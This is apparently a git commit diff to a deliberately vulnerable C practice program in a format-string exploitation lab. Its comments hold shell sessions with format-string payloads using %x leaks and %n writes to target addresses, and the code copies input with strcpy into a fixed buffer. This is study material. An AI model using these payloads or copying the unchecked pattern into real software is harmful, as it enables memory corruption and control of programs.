3ef89cf2cedb64d8afb9bf9883c1a42b521c91d0
Taishi <taishi.nojima@yale.edu>
2015-10-04 19:21:03 -0400

    villager_a

--- pwn/format_str/shellcode.c
+++ pwn/format_str/shellcode.c
@@ -19,7 +19,7 @@
 
 int main (int argc, char **argv){
 	char msg[1024];
-	static int test_value = -72, next_value = 0x11111111;
+	static int test_value = 72, next_value = 0x11111111;
 
 	strcpy(msg, argv[1]);
 
@@ -34,9 +34,13 @@ int main (int argc, char **argv){
 }
 
 /*
- * canopus@canopus:~/blackhat_python/pwn/format_str|master⚡
- * ⇒  ./exploitable $(printf "\x2c\xa0\x04\x08JUNK\x2d\xa0\x04\x08JUNK\x2e\xa0\x04\x08JUNK\x2f\xa0\x04\x08")%x%x%x%x%x%x%x%x%x%108x%n%17x%n%17x%n%17x%n
- * ,�JUNK-�JUNK.�JUNK/�bffff70e444471a81d4bffff5341a81d48                                                                                                          4c         4b4e554a         4b4e554a         4b4e554a
- * [DEBUG] test_value @ 0x0804a02c = -573785174 0xddccbbaa
- * ])
+ * canopus@canopus:~/blackhat_python/pwn/format_str|master
+ * ⇒  ./shellcode AAAA%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.
+ * AAAAbffff7c1.1a81d4.1a81d4.1a81d4.8.4c.41414141.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.
+ * [DEBUG] test_value @ 0x0804a028 = -72 0xffffffb8
+ * [DEBUG] next_value @ 0x0804a02c = 286331153 0x11111111
+ * [2]    921 segmentation fault (core dumped)  ./shellcode AAAA%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.
+ *
+ * canopus@canopus:~/blackhat_python/pwn/format_str|master
+ * ⇒  ./shellcode $(python fmt_exploit.py ./shellcode 7 0804a02c bfffff8d)))]]]
  */
